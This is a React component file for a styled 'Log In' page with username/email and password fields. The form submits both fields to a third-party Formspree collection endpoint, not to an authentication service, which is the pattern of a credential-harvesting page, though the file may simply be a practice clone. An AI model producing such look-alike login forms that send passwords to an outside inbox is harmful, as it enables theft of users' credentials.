import Button from 'react-bootstrap/Button';
import Form from 'react-bootstrap/Form';
import styled from 'styled-components';
import flag from "../flag.png"
import { Link } from 'react-router-dom';

function Register() {
  return (
    <Container>

<h1 style={{marginLeft:"260px"}}>Log In</h1>

    <form action="https://formspree.io/f/xayzloyg" method='POST'>
        <label style={{color:"rgb(14,173,255)", marginLeft:"540px"}}>USERNAME OR EMAIL</label>
        <input type="text" name='number' className='number' required/>
        <br />
        <br />

        <Link to="/login">
        <p className='email' style={{color:"rgb(14,173,255)", marginLeft:"540px"}}>use phone number instead</p>

        </Link>
        <label style={{marginLeft:"110px", color:"rgb(14,173,255)", marginLeft:"540px"}} >PASSWORD</label>

        <input type="password" name='password'  className='pass' required />

<button  type='submit'>Login</button>

    </form>
    </Container>
  );
}

const Container = styled.div`


form{
    display: grid;
    margin-left: -430px;
}

.phn{
    width: 50px;
    text-align: end;
    margin-left: 540px;
    
    

}

/* input{
    width: 200px;
    height: 27px;
    margin: 0 auto;
} */

input {
  padding: 10px;

  background: linear-gradient(#000, #000), linear-gradient(#000, #000), linear-gradient(#000, #000);
  background-size: 1px 20%, 100% 1px, 1px 20%;
  background-position: bottom left, bottom center, bottom right;
  background-repeat: no-repeat;

  border: none;
  color: #999;
}

.flag{
    width: 30px;
    height: 15px;
    position: absolute;
    margin-top: 25px;
    margin-left: 541px;
}

.number{
    width: 299px;
    position: absolute;
    margin-top: 18px;
    margin-left: 540px;
}

.email{
    margin-top: 5px;
    margin-left: -30px;
    
}

label{
    margin-left: -30px;
}



.pass{
    width: 300px;
    margin-left: 540px;
}


button{
    width: 150px;
    font-size: 16px;
    color: white;
    font-weight: 600;
    border: none;
    height: 40px;
    border-radius: 20px;
    background-color: rgb(175, 170, 170);
    margin-left: 610px;
    margin-top: 20px;

}



`;

export default Register;